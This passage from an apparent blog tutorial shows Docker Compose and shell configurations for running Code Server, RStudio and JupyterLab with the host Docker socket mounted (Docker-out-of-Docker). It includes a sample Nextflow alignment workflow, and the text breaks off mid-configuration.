plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">environment</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> JUPYTER_ENABLE_LAB=yes</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">command</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">&gt;</span><span class="token scalar string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">      jupyter lab </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">      --ip=0.0.0.0 </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">      --port=8888 </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">      --allow-root </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">      --no-browser</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">restart</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> unless</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">stopped</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="5-setting-up-code-server-with-dood">5. Setting Up Code Server with DooD<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#5-setting-up-code-server-with-dood" class="hash-link" aria-label="Direct link to 5. Setting Up Code Server with DooD" title="Direct link to 5. Setting Up Code Server with DooD" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="51-running-code-server-with-docker-socket-mount">5.1. Running Code Server with Docker Socket Mount<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#51-running-code-server-with-docker-socket-mount" class="hash-link" aria-label="Direct link to 5.1. Running Code Server with Docker Socket Mount" title="Direct link to 5.1. Running Code Server with Docker Socket Mount" translate="no">​</a></h3>
<p><strong>Code Server with full Docker access:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--rm</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8443</span><span class="token plain">:8443 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">PASSWORD</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">mypassword </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /var/run/docker.sock:/var/run/docker.sock </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /home/user/workspace:/home/coder/project </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /home/user/data:/data </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  codercom/code-server:latest</span><br></span></code></pre></div></div>
<p><strong>Access at:</strong> <a href="https://localhost:8443/" target="_blank" rel="noopener noreferrer" class="">https://localhost:8443</a></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="52-using-docker-from-code-server">5.2. Using Docker from Code Server<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#52-using-docker-from-code-server" class="hash-link" aria-label="Direct link to 5.2. Using Docker from Code Server" title="Direct link to 5.2. Using Docker from Code Server" translate="no">​</a></h3>
<p><strong>Integrated terminal for Docker commands:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># In Code Server terminal</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">ps</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> pull quay.io/biocontainers/nextflow:latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--rm</span><span class="token plain"> quay.io/biocontainers/nextflow:latest nextflow </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><br></span></code></pre></div></div>
<p><strong>Running and debugging Nextflow workflows:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># In Code Server terminal - edit Nextflow script</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> /workspace/main.nf </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;&lt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'EOF'</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">process alignment {</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">  container 'quay.io/biocontainers/bwa:latest'</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">  input:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">  path reference</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">  path reads</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">  </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">  output:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">  path "*.sam"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">  </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">  script:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">  """</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">  bwa mem $reference $reads &gt; aligned.sam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">  """</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">}</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">EOF</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run workflow locally with Docker</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">nextflow run main.nf -with-docker</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="53-docker-compose-configuration-for-code-server">5.3. Docker Compose Configuration for Code Server<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#53-docker-compose-configuration-for-code-server" class="hash-link" aria-label="Direct link to 5.3. Docker Compose Configuration for Code Server" title="Direct link to 5.3. Docker Compose Configuration for Code Server" translate="no">​</a></h3>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token key atrule" style="color:hsl(35, 99%, 36%)">version</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'3.8'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">services</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">code-server</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">image</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> codercom/code</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">server</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">container_name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> code</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">server</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">dev</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">ports</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"8443:8443"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">environment</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> PASSWORD=secure_password</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> SUDO_PASSWORD=secure_password</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">volumes</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Mount Docker socket for DooD</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> /var/run/docker.sock</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">/var/run/docker.sock</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Mount workspace</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> ./workspace</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">/home/coder/project</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">rw</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> ./data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">/data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">rw</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">restart</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> unless</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">stopped</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="6-complete-multi-app-setup-with-docker-compose">6. Complete Multi-App Setup with Docker Compose<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#6-complete-multi-app-setup-with-docker-compose" class="hash-link" aria-label="Direct link to 6. Complete Multi-App Setup with Docker Compose" title="Direct link to 6. Complete Multi-App Setup with Docker Compose" translate="no">​</a></h2>
<p><strong>Run RStudio, JupyterLab, and Code Server together:</strong></p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token key atrule" style="color:hsl(35, 99%, 36%)">version</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'3.8'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">services</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">rstudio</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">image</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> rocker/tidyverse</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">4.3.0</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">container_name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> rstudio</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">ports</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"8787:8787"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">environment</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> PASSWORD=rstudio_password</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">volumes</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> /var/run/docker.sock</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">/var/run/docker.sock</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> ./data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">/data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">rw</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> ./workspace</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">/workspace</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">rw</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">restart</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> unless</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">stopped</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">jupyter</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">image</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> jupyter/scipy</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">notebook</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">container_name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> jupyter</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">ports</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"8888:8888"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">volumes</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> /var/run/docker.sock</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">/var/run/docker.sock</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> ./data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">/data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">rw</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> ./notebooks</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">/notebooks</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">rw</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">command</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">&gt;</span><span class="token scalar string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">      jupyter lab </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">      --ip=0.0.0.0 </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">      --allow-root </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">      --no-browser</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">restart</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> unless</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">stopped</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">code-server</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">image</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> codercom/code</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">server</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">container_name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> code</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">server</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">ports</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"8443:8443"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">environment</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> PASSWORD=code_password</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">volumes</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> /var/run/docker.sock</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">/var/run/docker.sock</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> ./workspace</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">/home/coder/project</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">rw</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> ./data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">/data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">rw</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">restart</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> unless</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">stopped</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Optional: shared data volume container</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">image</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> alpine</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">volumes</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span 